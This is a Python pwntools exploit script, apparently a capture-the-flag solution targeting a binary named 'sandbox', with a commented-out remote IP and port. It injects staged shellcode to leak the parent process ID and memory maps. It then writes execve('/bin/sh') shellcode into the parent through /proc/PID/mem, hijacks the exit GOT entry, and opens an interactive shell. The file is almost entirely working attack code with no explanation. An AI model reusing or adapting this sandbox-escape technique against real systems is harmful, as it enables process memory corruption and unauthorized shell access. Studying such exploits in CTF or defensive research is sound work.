

from pwn import *
import textwrap

# p = process(['files/sandbox','files/king'])
# p = remote('3.0.58.217', 2001)

context.arch = 'amd64'

def read_rax():
	res = asm('''
		push r14
		''')
	res += asm(shellcraft.write(1, 'rsp', 0x8))
	return res

def read_val_at_stack(amount=8):
	res = b''
	res += asm(shellcraft.write(1, 'rsp', amount))
	return res

def send(sc):
	sc = asm('''
		xor rax, rax
		xor rdi, rdi
		mov rsi, rbx
		mov rdx, 50
		syscall
		''') + sc + asm('''jmp rbx''')
	assert len(sc) <= 50
	p.sendline(sc)

def pushstr(my_str, nop='\x00'):
	tmp = [my_str[i:i+8] for i in range(0, len(my_str), 8)][::-1]
	for i in tmp:
		sc = asm('''
		mov rax, {}
		push rax
		'''.format(u64(i.ljust(8, nop))))
		send(sc)



'''init pattern'''
sc = asm('''
	xor rax, rax
	xor rdi, rdi
	mov rsi, rbx
	mov rdx, 50
	syscall
	''')
p.sendline(sc)



'''Open and read /proc/self/stat to get PPID'''
pushstr("/proc/self/stat")
sc = asm('''
	mov rax, 2
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall
	mov r14, rax
	''')
send(sc)
sc = asm(shellcraft.read(3, 'rsp', 0x200))
send(sc)
sc = asm(shellcraft.write(1, 'rsp', 0x200))
send(sc)
sc = asm(shellcraft.close(3))
send(sc)
p.recvuntil('R ')
PPID = int(p.recvuntil(' '))
print(PPID)



'''Open and read /proc/ppid/maps to get libc and got of parent process'''
pushstr('/proc/{}/maps\x00'.format(PPID))
sc = asm(shellcraft.open('rsp', 0, 0))
send(sc)
sc = asm(shellcraft.read(3, 'rsp', 0xa00))
send(sc)
sc = asm(shellcraft.write(1, 'rsp', 0xa00))
send(sc)
sc = asm(shellcraft.close(3))
send(sc)

p.recvuntil('sandbox')
sandbox_base = int(p.recvuntil('-')[:-1], 16)
print(hex(sandbox_base))
main = sandbox_base + 0xd0
exit_got = sandbox_base + 0x2fb8
p.recvuntil('[heap]')
libc_base = int(p.recvuntil('-')[:-1], 16)
print(hex(libc_base))
# one_gadget = libc_base + 0xe6ce9
# system = libc_base + 0x55410
bin_sh = libc_base + 0x1b75aa
# stdout = libc_base + 0x1ec6a0
# file_finish = libc_base + 0x1ed4c0



'''Open, lseek, and write to /proc/ppid/mem'''
pushstr('/proc/{}/mem'.format(PPID))
sc = asm(shellcraft.open('rsp', 2, 0))
send(sc)
sc = asm('''
mov rax, 8
mov rdi, 3
mov rsi, {}
mov dl, 1
syscall
'''.format(main))
send(sc)
payload = b'\x90'*10 + asm('''
	mov rax, 0x3b
	mov rdi, {}
	xor rsi, rsi
	xor rdx, rdx
	syscall
	'''.format(bin_sh)) + b'\x90'*10
pushstr(payload, nop=b'\x00')
sc = asm(shellcraft.write(3, 'rsp', len(payload)))
send(sc)
sc = asm(shellcraft.close(3))
send(sc)

pushstr('/proc/{}/mem'.format(PPID))
sc = asm(shellcraft.open('rsp', 2, 0))
send(sc)
sc = asm('''
mov rax, 8
mov rdi, 3
mov rsi, {}
mov dl, 1
syscall
'''.format(exit_got))
send(sc)
sc = asm('''
	mov rdi, {}
	push rdi
	'''.format(main))
send(sc)
sc = asm(shellcraft.write(3, 'rsp', 8))
send(sc)
sc = asm(shellcraft.close(3))
send(sc)



sc = asm('''
mov rax, 0x3b
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
''')
send(sc)

p.interactive()
p.close()
